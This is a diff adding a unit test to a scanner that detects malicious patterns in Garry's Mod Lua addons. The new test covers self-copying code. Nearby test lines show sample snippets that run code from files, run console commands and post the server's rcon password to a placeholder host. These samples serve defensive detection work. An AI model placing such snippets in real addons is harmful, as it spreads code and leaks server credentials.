@@ -98,6 +98,11 @@ class RuleTests(unittest.TestCase):
         self.assertIn('file-execution', rules('RunString(file.Read("materials/test.vmt", "GAME"))'))
         self.assertIn('console-execution', rules('game.ConsoleCommand("lua_run print(1)")'))
 
+    def test_possible_code_propagation_needs_script_copy_evidence(self):
+        self.assertIn('code-propagation', rules('local source = file.Read("source.lua", "LUA")\nfile.Write("new_loader.lua", source)'))
+        self.assertIn('code-propagation', rules('local info = debug.getinfo(1)\nfile.Write(target, file.Read(info.short_src))'))
+        self.assertNotIn('code-propagation', rules('file.Write("score.json", util.TableToJSON(scores))'))
+
     def test_credential_transfer_not_hostname_telemetry(self):
         self.assertIn('possible-exfiltration', rules('http.Post("https://example.invalid", {password=GetConVar("rcon_password"):GetString()})'))
         self.assertNotIn('possible-exfiltration', rules('http.Post("https://example.invalid", {hostname=GetConVar("hostname"):GetString()})'))
